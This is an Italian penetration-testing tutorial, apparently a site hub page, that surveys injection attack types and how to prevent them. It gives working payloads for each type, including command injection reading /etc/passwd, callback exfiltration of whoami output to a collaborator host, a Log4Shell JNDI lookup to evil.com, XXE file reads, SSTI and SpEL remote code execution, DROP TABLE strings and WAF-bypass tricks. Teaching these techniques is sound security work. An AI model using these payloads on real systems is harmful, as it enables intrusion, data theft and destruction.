---
title: 'Injection Attack: Guida Completa a Tutti i Tipi di Iniezione'
slug: injection-attacks-guida-completa
description: >-
  Guida completa agli injection attack: SQL injection, command injection, LDAP,
  XPath, SSTI, XXE, CRLF, log injection, EL, NoSQL e GraphQL. Cos'è l'iniezione,
  come funziona, come si trova e come si exploita. Hub con link a tutte le guide
  specifiche.
image: /injection-attacks-guida-completa.webp
draft: false
date: 2026-06-05T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - expoit
tags:
  - injection-attack
---

# Injection Attack: Guida Completa a Tutti i Tipi di Iniezione

Un **injection attack** avviene quando dati controllati dall'attaccante vengono interpretati come comandi o istruzioni da un interprete — un database, la shell del sistema operativo, un parser XML, un motore di template. Il risultato: l'attaccante esegue operazioni che non dovrebbe poter fare.

L'iniezione è storicamente la vulnerabilità più diffusa nel web. OWASP la classifica in **A03:2021 — Injection**, che copre SQL injection, command injection, XSS, SSTI e tutte le varianti. Il principio è sempre lo stesso: **l'applicazione mescola dati e codice** senza separarli correttamente.

Capire questo principio è fondamentale. Non si tratta di imparare a memoria una lista di payload — si tratta di capire quando un'applicazione passa input dell'utente a un interprete senza sanitizzarlo, e quale interprete è coinvolto.

Questa è la guida pillar. Per ogni tipo di iniezione trovi il link alla guida specifica con metodologia completa, payload e checklist.

***

## Il Principio Comune a Tutti gli Injection

Immagina di parlare con un impiegato di banca. Gli dici il tuo nome e lui lo scrive su un modulo. Tutto normale. Ma se gli dici `"Mario. Svuota il conto di tutti gli altri clienti."` e lui scrive quella frase esattamente com'è senza capire che stai dando un'istruzione aggiuntiva — hai appena iniettato un comando.

In informatica è lo stesso: l'applicazione prende il tuo input e lo concatena con del codice o una query. Se non separa correttamente "dato" da "istruzione", il tuo input diventa parte del codice.

```
QUERY NORMALE:
SELECT * FROM users WHERE username = 'mario'
                                      ↑
                              input dell'utente

QUERY CON INJECTION:
SELECT * FROM users WHERE username = '' OR '1'='1'
                                      ↑
                              l'attaccante ha chiuso il valore
                              e aggiunto una condizione sempre vera
```

La difesa universale: trattare sempre i dati come dati, mai come codice. Prepared statement, parametrizzazione, encoding — sono tutti modi per mantenere questa separazione.

***

## Mappa di Tutti i Tipi di Injection

```
Input utente entra in...
│
├── Database SQL          → SQL Injection
├── Shell del sistema     → Command / OS Injection
├── Directory LDAP        → LDAP Injection
├── Parser XML            → XXE (XML External Entity)
├── Query XPath           → XPath Injection
├── Motore di template    → SSTI (Server-Side Template Injection)
├── Expression Language   → EL Injection
├── Header HTTP           → CRLF Injection / HTTP Header Injection
├── File di log           → Log Injection
└── API GraphQL           → GraphQL Injection
```

***

## SQL Injection

**Cos'è:** l'input dell'utente viene concatenato direttamente in una query SQL senza parametrizzazione. L'attaccante modifica la logica della query.

**Impatto:** dump completo del database, bypass autenticazione, scrittura su filesystem (in alcune configurazioni), escalation a RCE.

**Esempio in 10 secondi:**

```sql
-- Query originale
SELECT * FROM users WHERE email = 'mario@mail.com' AND password = 'pass'

-- Con injection nel campo email
SELECT * FROM users WHERE email = 'admin@mail.com'--' AND password = 'qualsiasi'
--                                                   ↑
--                                      -- commenta il resto → bypass auth
```

**Varianti:**

* **SQL Injection Classica** — errore visibile, output diretto nella response → [sql-injection-classica](https://hackita.it/articoli/sql-injection-classica)
* **Blind SQL Injection** — nessun output, inferisci i dati da comportamenti (true/false, timing) → [blind-sql-injection](https://hackita.it/articoli/blind-sql-injection)
* **Time-Based SQL Injection** — usi `SLEEP()` o `WAITFOR DELAY` per estrarre dati bit per bit dai tempi di risposta → [time-based-sql-injection](https://hackita.it/articoli/time-based-sql-injection)
* **SQL Injection su API REST** — l'injection arriva in parametri JSON invece che nei form tradizionali → [sql-injection-api-rest](https://hackita.it/articoli/sql-injection-api-rest)
* **SQL Injection su ORM** — anche i query builder come Eloquent o SQLAlchemy possono essere vulnerabili se usati male → [sql-injection-orm](https://hackita.it/articoli/sql-injection-orm)

**Target comune: MSSQL** — se trovi la porta 1433 aperta durante la ricognizione, MSSQL è spesso un vettore privilegiato per SQL injection con escalation a xp\_cmdshell (RCE) → [porta-1433-mssql](https://hackita.it/articoli/porta-1433-mssql)

→ **Guida completa:** [sql-injection](https://hackita.it/articoli/sql-injection)

***

## Command Injection / OS Command Injection

**Cos'è:** l'input dell'utente viene passato a una funzione che esegue comandi di sistema (`exec()`, `system()`, `popen()`, `subprocess`). L'attaccante inietta comandi aggiuntivi.

**Impatto:** RCE immediata — accesso completo al sistema operativo con i privilegi del processo web.

**Esempio:**

```bash
# L'applicazione esegue ping sull'IP fornito dall'utente
ping -c 1 USER_INPUT

# Input normale:
ping -c 1 192.168.1.1

# Con injection:
ping -c 1 192.168.1.1; cat /etc/passwd
ping -c 1 192.168.1.1 && whoami
ping -c 1 $(whoami)
ping -c 1 `id`
```

**Caratteri separatori da testare:**

```
;   →  esegue comando successivo
&&  →  esegue se il primo ha successo
||  →  esegue se il primo fallisce
|   →  pipe: output del primo diventa input del secondo
`   →  backtick: esecuzione inline
$() →  command substitution
\n  →  newline come separatore (in alcuni contesti)
```

**Blind command injection** — nessun output visibile, usi callback DNS/HTTP per confermare:

```bash
# Se non vedi l'output, usa un ping/curl verso il tuo server
; curl http://COLLABORATOR.burpcollaborator.net/$(whoami)
; nslookup $(whoami).COLLABORATOR.burpcollaborator.net
```

→ **Guida completa:** [command-injection](https://hackita.it/articoli/command-injection) — [os-command-injection](https://hackita.it/articoli/os-command-injection)

***

## LDAP Injection

**Cos'è:** l'input dell'utente viene inserito in un filtro LDAP senza escaping. Usato quando l'applicazione autentica gli utenti tramite un directory service (Active Directory, OpenLDAP).

**Impatto:** bypass autenticazione, enumerazione utenti e gruppi, dump della directory.

**Esempio:**

```
# Filtro LDAP originale per il login
(&(uid=UTENTE)(password=PASS))

# Con injection nel campo username
# Chiudi il filtro e aggiungi una condizione sempre vera:
UTENTE: admin)(&
# Risultato: (&(uid=admin)(&)(password=qualsiasi))
# → Il filtro è sempre vero → bypass auth come admin

# Wildcard per enumerare utenti
UTENTE: *
# Risultato: (&(uid=*)(password=qualsiasi))
# → Lista tutti gli utenti
```

→ **Guida completa:** [ldap-injection](https://hackita.it/articoli/ldap-injection)

***

## XXE — XML External Entity Injection

**Cos'è:** l'applicazione parsa XML fornito dall'utente e il parser XML supporta le "entità esterne" — riferimenti a file locali o URL remoti. L'attaccante usa questa funzionalità per leggere file di sistema o fare SSRF.

**Impatto:** lettura di file locali (`/etc/passwd`, chiavi SSH, file di configurazione), SSRF verso reti interne, in casi rari RCE.

**Esempio:**

```xml
<!-- Payload XXE per leggere /etc/passwd -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>

<!-- L'applicazione parsa questo XML e restituisce il contenuto
     di /etc/passwd al posto di &xxe; -->
```

**Dove cercare:** upload di file XML, endpoint SOAP, SVG upload, import di dati via XML, qualsiasi campo che accetti XML o trasformi il body in XML internamente.

→ **Guida completa:** [xxe](https://hackita.it/articoli/xxe) — [xxe-injection](https://hackita.it/articoli/xxe-injection)

***

## XPath Injection

**Cos'è:** simile alla SQL injection ma su database XML. L'applicazione usa XPath per interrogare file XML (configurazioni, dati) e concatena l'input dell'utente nella query senza escaping.

**Impatto:** bypass autenticazione, lettura di nodi XML arbitrari (dati utenti, credenziali, configurazioni).

**Esempio:**

```xpath
# Query XPath originale per il login
//users/user[username/text()='mario' and password/text()='pass']

# Con injection nel campo username:
mario' or '1'='1

# Query risultante:
//users/user[username/text()='mario' or '1'='1' and password/text()='pass']
# → La condizione or '1'='1' è sempre vera → bypass auth
```

**Payload comuni:**

```
' or '1'='1
' or '1'='1' or 'x'='x
'] | //* | /foo['
x' or name()='username' or 'x'='y
```

→ **Guida completa:** [xpath-injection](https://hackita.it/articoli/xpath-injection)

***

## SSTI — Server-Side Template Injection

**Cos'è:** l'input dell'utente viene inserito direttamente in un template lato server (Jinja2, Twig, Freemarker, Velocity, Smarty, ERB, Pebble, Thymeleaf) senza escaping. Il motore di template lo valuta come codice, non come dato.

**Impatto:** RCE — il motore di template ha accesso all'ambiente del server e puoi usarlo per eseguire comandi.

**Esempio (Jinja2 — Python/Flask):**

```python
# Codice vulnerabile Flask
@app.route('/hello')
def hello():
    name = request.args.get('name')
    return render_template_string(f"Ciao {name}!")  # ← concatenazione diretta

# Input normale:
# /hello?name=Mario → Ciao Mario!

# Con injection:
# /hello?name={{7*7}} → Ciao 49!  (il template ha valutato 7*7)
# /hello?name={{config}} → mostra la configurazione Flask
# /hello?name={{''.__class__.__mro__[1].__subclasses__()}} → introspezione Python
# Escalation a RCE:
# /hello?name={{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}
```

**Fingerprinting del motore di template:**

```
{{7*7}}      → 49      → Jinja2, Twig
${7*7}       → 49      → Freemarker, Velocity
#{7*7}       → 49      → Pebble
*{7*7}       → 49      → Thymeleaf (Spring)
<%= 7*7 %>   → 49      → ERB (Ruby)
```

→ **Guida completa:** [ssti-server-side-template-injection](https://hackita.it/articoli/ssti-server-side-template-injection)

**Guide per motore specifico:**

* [jinja2-ssti-rce](https://hackita.it/articoli/jinja2-ssti-rce) · [twig-ssti-rce](https://hackita.it/articoli/twig-ssti-rce) · [freemarker-ssti-rce](https://hackita.it/articoli/freemarker-ssti-rce)
* [velocity-ssti-rce](https://hackita.it/articoli/velocity-ssti-rce) · [erb-ssti-rce](https://hackita.it/articoli/erb-ssti-rce) · [pebble-ssti-rce](https://hackita.it/articoli/pebble-ssti-rce)
* [thymeleaf-ssti-rce](https://hackita.it/articoli/thymeleaf-ssti-rce) · [smarty-ssti-rce](https://hackita.it/articoli/smarty-ssti-rce) · [mako-ssti-rce](https://hackita.it/articoli/mako-ssti-rce)

***

## Expression Language Injection (EL Injection)

**Cos'è:** specifico per applicazioni Java che usano Expression Language (JSP EL, Spring SpEL, OGNL in Struts). L'input viene valutato come espressione EL invece che come dato.

**Impatto:** lettura di variabili interne, esecuzione di metodi Java, RCE in alcuni contesti.

**Esempio (Spring SpEL):**

```java
// Vulnerabile: valuta l'input come SpEL expression
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(userInput);  // ← RCE se userInput è controllato

// Payload:
T(java.lang.Runtime).getRuntime().exec('id')
T(java.lang.ProcessBuilder).new(new String[]{'id'}).start()
```

→ **Guida completa:** [expression-language-injection](https://hackita.it/articoli/expression-language-injection)

***

## CRLF Injection / HTTP Header Injection

**Cos'è:** `\r\n` (Carriage Return + Line Feed) è il separatore di riga negli header HTTP. Se l'input dell'utente viene inserito in un header HTTP senza escaping e contiene `\r\n`, l'attaccante può aggiungere header arbitrari o iniettare un body nella risposta.

**Impatto:** HTTP response splitting, XSS via header injection, cache poisoning, session fixation, redirect malevolo.

**Esempio:**

```
# URL vulnerabile: /redirect?url=https://safe.com
# Response: Location: https://safe.com

# Con injection:
/redirect?url=https://safe.com%0d%0aSet-Cookie:%20session=ATTACKER_SESSION

# Response risultante:
HTTP/1.1 302 Found
Location: https://safe.com
Set-Cookie: session=ATTACKER_SESSION   ← iniettato dall'attaccante
```

→ **Guida completa:** [crlf-injection](https://hackita.it/articoli/crlf-injection) — [http-header-injection](https://hackita.it/articoli/http-header-injection)

***

## Log Injection

**Cos'è:** l'input dell'utente viene scritto nei file di log dell'applicazione senza sanitizzazione. L'attaccante inietta false voci di log per inquinare i log, nascondere attività reali, o exploitare sistemi che consumano i log (SIEM, log viewer).

**Impatto:** falsificazione di audit trail, XSS su interfacce web di visualizzazione log, log4shell (RCE via log injection in Log4j), iniezione di comandi se i log vengono processati da script.

**Esempio:**

```bash
# Campo username nel login
username = "admin\n[2024-01-15 10:23:11] INFO Login successful for: root"
# → Il log mostra un accesso riuscito di root che non è mai avvenuto

# Log4Shell (CVE-2021-44228) — il caso più grave
# Log4j valutava le espressioni JNDI nei messaggi di log
username = "${jndi:ldap://evil.com/a}"
# → Log4j contatta evil.com → carica un payload Java → RCE
```

→ **Guida completa:** [log-injection](https://hackita.it/articoli/log-injection)

***

## GraphQL Injection

**Cos'è:** le API GraphQL sono vulnerabili a injection se i resolver non parametrizzano le query verso il database backend. In più, GraphQL ha vettori specifici come introspection abusata, batch query per brute force, e nested query per DoS.

**Impatto:** SQL injection via GraphQL resolver, enumerazione dello schema, brute force tramite batch queries, DoS con query annidate.

**Esempio:**

```graphql
# Batch query per brute force OTP (100 tentativi in una sola richiesta)
mutation {
  login1: login(username: "admin", otp: "000000") { token }
  login2: login(username: "admin", otp: "000001") { token }
  login3: login(username: "admin", otp: "000002") { token }
  # ... fino a 999999
}

# Introspection: scopri tutto lo schema
{ __schema { types { name fields { name } } } }
```

→ **Guida completa:** [graphql-exploitation](https://hackita.it/articoli/graphql-exploitation)

***

## Come Identificare Injection: Metodologia Generale

Indipendentemente dal tipo, il processo di discovery è sempre lo stesso:

**Passo 1 — Mappa tutti gli input**

Ogni punto in cui l'applicazione riceve dati dall'utente è un potenziale punto di injection: campi form, parametri URL, header HTTP, cookie, body JSON/XML, file upload.

```bash
# Con Burp: usa il Proxy History per vedere tutto il traffico
# Filtra per parametri: cerca input che vengono "riflessi" nella response
# o che cambiano il comportamento dell'applicazione
```

**Passo 2 — Identifica l'interprete**

Cosa fa l'applicazione con quell'input? Lo passa a un database? Lo usa in un template? Lo mette in un header HTTP? Lo scrive in un log? L'interprete determina il tipo di injection da testare.

```bash
# Indizi sull'interprete:
# - Errori SQL visibili → database
# - Errori di template → motore template
# - Comportamento diverso con caratteri speciali → parsing
# - Tempo di risposta variabile con SLEEP() → SQL time-based
```

**Passo 3 — Prova caratteri speciali**

Ogni interprete ha caratteri speciali che alterano il parsing. Prova sempre questi come prima cosa:

```
'       → SQL, XPath, LDAP
"       → SQL, XPath
;       → Command injection
&&  ||  → Command injection
{{  }}  → Template injection (Jinja2, Twig)
${  }   → Template injection (Freemarker, EL)
\r\n    → CRLF injection
<!      → XXE
--  #   → SQL comment
```

**Passo 4 — Osserva il comportamento**

* Errore visibile → injection confermata (può anche rivelare il tipo di interprete)
* Comportamento diverso tra input normale e input con caratteri speciali → injection possibile
* Nessuna differenza → potrebbe esserci sanitizzazione, o l'input non va a un interprete

**Passo 5 — Usa tool di automazione per conferma**

```bash
# SQL injection → sqlmap
sqlmap -u "https://target.com/search?q=test" --dbs

# Command injection → commix
commix --url="https://target.com/ping?host=127.0.0.1"

# Template injection → tplmap
python3 tplmap.py -u "https://target.com/hello?name=test"

# XXE → Burp Scanner o BApp XXE
# LDAP injection → jxploit, ldap-blind-explorer
```

***

## NoSQL Injection

**Cos'è:** le applicazioni che usano database NoSQL (MongoDB, CouchDB, Redis) costruiscono query con operatori propri invece di SQL. Se l'input dell'utente finisce in questi operatori senza validazione, l'attaccante può alterare la logica della query.

**Impatto:** bypass autenticazione, lettura di dati di altri utenti, enumerazione del database.

**Esempio con MongoDB — bypass login:**

```
# Login normale in JSON
{"username": "mario", "password": "pass"}

# Con injection: l'operatore $ne ("not equal") rende la query sempre vera
{"username": "admin", "password": {"$ne": ""}}
# → MongoDB cerca: username=admin AND password != ""
# → Qualsiasi password != "" → bypassa l'autenticazione

# In URL-encoded (form tradizionale):
username=admin&password[$ne]=anything

# Enumerazione: $regex per capire quali utenti esistono
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
# → Restituisce utenti il cui username inizia con 'a'

# Estrazione blind con $regex carattere per carattere
{"username": "admin", "password": {"$regex": "^a"}}  # True se password inizia con 'a'
{"username": "admin", "password": {"$regex": "^b"}}  # False → non inizia con 'b'
# → Inferisci la password lettera per lettera
```

***

## Second-Order Injection

**Cos'è:** il payload non viene eseguito subito, ma viene salvato nel database e poi eseguito in un secondo momento quando quei dati vengono riusati in una query non sanitizzata. È la vulnerabilità più insidiosa perché si trova in un posto e si scatena in un altro.

**Impatto:** uguale alle injection dirette (RCE, dump DB, bypass auth) — ma molto più difficile da individuare nei code review e nei test automatici.

**Come funziona:**

```
Step 1 — Registrazione (il payload viene "salvato")
  Username: admin'--
  L'applicazione sanitizza correttamente l'input → salvato nel DB come admin'--
  Sembra sicuro. Nessun errore.

Step 2 — Cambio password (il payload viene RIUSATO senza sanitizzazione)
  Il codice fa:
  UPDATE users SET password='nuova' WHERE username='admin'--'
                                                   ↑
                                    questo viene dal DB, il developer
                                    non lo sanitizza di nuovo perché
                                    "viene dal nostro DB, è già sicuro"
  
  La query effettiva:
  UPDATE users SET password='nuova' WHERE username='admin'--'
  Il -- commenta il resto → aggiorna la password di TUTTI gli utenti admin
```

**Come trovarlo:**

```bash
# Registra un account con payload SQL nel nome/username
curl -X POST "https://target.com/register" \
  -d "username=admin'--&email=test@test.com&password=pass"
# Nessun errore? → salvato nel DB

# Ora usa funzionalità che riusano quei dati: cambio password, profilo, export
# Osserva comportamenti anomali: errori SQL, dati di altri utenti, modifche non attese

# Pattern comuni da testare come username:
# admin'--
# ' OR '1'='1
# admin'; DROP TABLE users;--
# 1' UNION SELECT 1,username,password FROM users--
```

***

## HTTP Parameter Pollution (HPP)

**Cos'è:** mandi lo stesso parametro più volte nella stessa request. WAF e backend lo processano diversamente — il WAF vede solo il primo valore (pulito), il backend usa il secondo (malevolo).

**Impatto:** bypass WAF, bypass validazione input, comportamenti imprevisti nella logica applicativa. Ricerca del 2025 ha dimostrato che questa tecnica bypassa oltre il 70% delle configurazioni WAF testate, con solo pochi provider (Google Cloud Armor, Azure WAF con ruleset 2.1) in grado di bloccarla.

**Come funziona:**

```bash
# Query string con parametro duplicato
https://target.com/search?q=legit&q='; DROP TABLE users;--
# WAF → vede q=legit → OK, nessun payload rilevato
# Backend (ASP.NET) → concatena i valori: q="legit, '; DROP TABLE users;--"
# Oppure usa il secondo valore: q="'; DROP TABLE users;--"

# Dipende dal framework come vengono gestiti i duplicati:
# ASP.NET    → concatena con virgola
# PHP        → usa l'ultimo
# Flask/Django → usa il primo
# Express.js → crea un array

# HPP + XSS per bypassare WAF (tecnica 2025):
# ASP.NET concatena i parametri → payload distribuito su più parametri
?name=<img&name= src=x&name= onerror=alert(1)>
# ASP.NET: name = "<img, src=x, onerror=alert(1)>"  ← WAF non lo rileva come XSS
# Il browser riassembla e interpreta il tag
```

***

## Unicode Normalization Injection

**Cos'è:** alcuni caratteri Unicode vengono "normalizzati" a caratteri ASCII standard dal backend o dal database. Se il WAF o il filtro di input non conosce queste equivalenze, un payload scritto con caratteri Unicode esotici passa i filtri ma viene eseguito correttamente.

**Come funziona:**

```bash
# Caratteri Unicode che si normalizzano a ' (singolo apice) in alcuni DB:
# ＇ (U+FF07, fullwidth apostrophe)
# ʼ  (U+02BC, modifier letter apostrophe)
# ′  (U+2032, prime)

# Payload SQL che bypassa filtri sul carattere '
username: admin＇--
# Il filtro cerca ' → non lo trova → payload passa
# Il DB normalizza ＇ a ' → la query diventa: WHERE username='admin'--'

# Test di base: prova caratteri Unicode "equivalenti" nei campi
# ＜ (U+FF1C) → < per XSS bypass
# ＞ (U+FF1E) → >
# ／ (U+FF0F) → / per path traversal

# Tool: Burp Suite + Unicode Fuzzer extension
# oppure manuale con payload da intltest
```

***

## Injection negli Header HTTP (WAF Bypass)

**Cos'è:** molti WAF analizzano body e query string ma ignorano (o analizzano meno attentamente) gli header HTTP. Se l'applicazione usa certi header per costruire query o comandi, quelli sono vettori di injection non protetti.

```bash
# Header spesso loggati senza sanitizzazione → log injection / SQL injection
User-Agent: Mozilla' OR '1'='1
X-Forwarded-For: 127.0.0.1' OR SLEEP(5)--
Accept-Language: en' UNION SELECT username,password FROM users--
Referer: https://evil.com/' OR '1'='1

# Perché funziona:
# 1. Il WAF applica regole più permissive agli header che al body
# 2. L'applicazione logga questi header e poi fa query sui log
# 3. L'IP in X-Forwarded-For viene usato in whitelist/blacklist via DB

# Come testare:
curl "https://target.com/login" \
  -H "X-Forwarded-For: 1.1.1.1' OR SLEEP(5)--" \
  -d "username=test&password=test"
# Se la response impiega 5 secondi → SQL injection nell'header confermata
```

***

## Prevenzione: Il Principio Universale

Tutti gli injection si prevengono con lo stesso approccio: **mai concatenare input utente con codice o query. Sempre parametrizzare.**

```python
# SQL → Prepared Statement
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))

# Command → evita exec() con input utente. Se necessario, usa lista di argomenti
subprocess.run(["ping", "-c", "1", ip_address])  # NO shell=True

# Template → non inserire input utente nel template stesso
render_template("hello.html", name=user_input)  # sì
render_template_string(f"Ciao {user_input}")    # NO

# LDAP → usa librerie con escaping nativo o escapa manualmente
# XML → disabilita le external entities nel parser
# Log → logga solo dopo sanitizzazione (rimuovi \n, \r, JNDI lookups)
```

***

## Mappa dei Link Interni

| Tipo                   | Guida dedicata                                                                                                                                                                                                                                                                                                                                                                      |
| ---------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| SQL Injection          | [sql-injection](https://hackita.it/articoli/sql-injection) · [classica](https://hackita.it/articoli/sql-injection-classica) · [blind](https://hackita.it/articoli/blind-sql-injection) · [time-based](https://hackita.it/articoli/time-based-sql-injection) · [API REST](https://hackita.it/articoli/sql-injection-api-rest) · [ORM](https://hackita.it/articoli/sql-injection-orm) |
| Command Injection      | [command-injection](https://hackita.it/articoli/command-injection) · [os-command-injection](https://hackita.it/articoli/os-command-injection)                                                                                                                                                                                                                                       |
| LDAP Injection         | [ldap-injection](https://hackita.it/articoli/ldap-injection)                                                                                                                                                                                                                                                                                                                        |
| XXE                    | [xxe](https://hackita.it/articoli/xxe) · [xxe-injection](https://hackita.it/articoli/xxe-injection)                                                                                                                                                                                                                                                                                 |
| XPath Injection        | [xpath-injection](https://hackita.it/articoli/xpath-injection)                                                                                                                                                                                                                                                                                                                      |
| SSTI                   | [ssti-server-side-template-injection](https://hackita.it/articoli/ssti-server-side-template-injection)                                                                                                                                                                                                                                                                              |
| EL Injection           | [expression-language-injection](https://hackita.it/articoli/expression-language-injection)                                                                                                                                                                                                                                                                                          |
| CRLF / Header          | [crlf-injection](https://hackita.it/articoli/crlf-injection) · [http-header-injection](https://hackita.it/articoli/http-header-injection)                                                                                                                                                                                                                                           |
| Log Injection          | [log-injection](https://hackita.it/articoli/log-injection)                                                                                                                                                                                                                                                                                                                          |
| GraphQL                | [graphql-exploitation](https://hackita.it/articoli/graphql-exploitation)                                                                                                                                                                                                                                                                                                            |
| RCE (risultato finale) | [rce](https://hackita.it/articoli/rce)                                                                                                                                                                                                                                                                                                                                              |

***

## Checklist

```
DISCOVERY
☐ Tutti i punti di input mappati (form, URL, header, cookie, JSON/XML, file)
☐ Caratteri speciali testati: ' " ; && || {{ }} ${ } \r\n <!
☐ Errori o comportamenti anomali osservati e annotati
☐ Interprete identificato (DB, shell, template, XML parser, log...)

PER TIPO
☐ SQL: ' nella query → errore? → sqlmap per conferma
☐ Command: ; whoami → output? → commix per automazione
☐ SSTI: {{7*7}} → 49? → tplmap per identificare il motore
☐ XXE: DOCTYPE con entità esterna → file letto nella response?
☐ LDAP: ' o * nel login → bypass o comportamento anomalo?
☐ XPath: ' or '1'='1 nel login → accesso?
☐ CRLF: %0d%0a nei parametri URL/header → header iniettato nella response?
☐ Log: \n nel campo → falsa riga nei log? Log4j: ${jndi:...}?
☐ GraphQL: introspection attiva? Batch query per brute force?

ESCALATION
☐ SQL → dump DB → credenziali → ATO?
☐ Command / SSTI → RCE → reverse shell → post-exploitation?
☐ XXE → /etc/passwd → chiavi SSH → credenziali?
☐ LDAP → bypass auth → account admin?
```

***

## FAQ

**Quale tipo di injection è più pericoloso?**
Command injection e SSTI portano direttamente a RCE — accesso completo al server. SQL injection può portare a dump completo del database, che spesso contiene credenziali per escalare ulteriormente. XXE può portare a lettura di file sensibili e SSRF. In pratica: dipende dal contesto, ma command injection e SSTI sono le più immediate.

**Come faccio a distinguere i tipi di injection?**
Dal comportamento dell'applicazione con caratteri speciali. Errore SQL → SQL injection. `{{7*7}}` valutato a 49 → template injection. Risposta più lenta con `SLEEP(5)` → SQL time-based. Nessun output ma callback DNS → blind injection. Osserva il tipo di interprete che probabilmente gestisce quell'input.

**sqlmap è sufficiente per trovare tutte le SQL injection?**
No. sqlmap è ottimo per le SQL injection nei parametri GET/POST classici, ma fa fatica con injection in header HTTP, cookie complessi, JSON annidati, o quando c'è una WAF. Il testing manuale rimane fondamentale per i casi non standard.

**Posso trovare injection con solo un browser?**
In modo limitato. Puoi inserire caratteri speciali nei campi e osservare errori. Ma per testing sistematico hai bisogno di Burp Suite — ti permette di modificare qualsiasi parte della request (header, cookie, body) che il browser non ti lascia toccare.

***

## Risorse

* [PortSwigger Web Security Academy — Injection](https://portswigger.net/web-security/injection)
* [OWASP Injection](https://owasp.org/www-community/Injection_Flaws)
* [PayloadsAllTheThings — tutti i payload per ogni tipo di injection](https://github.com/swisskyrepo/PayloadsAllTheThings)

***

> Dal singolo apice a una shell sul server: l'injection è il concetto più antico e più vivo del web hacking. [Penetration test HackIta](https://hackita.it/servizi). [Formazione 1:1](https://hackita.it/formazione).
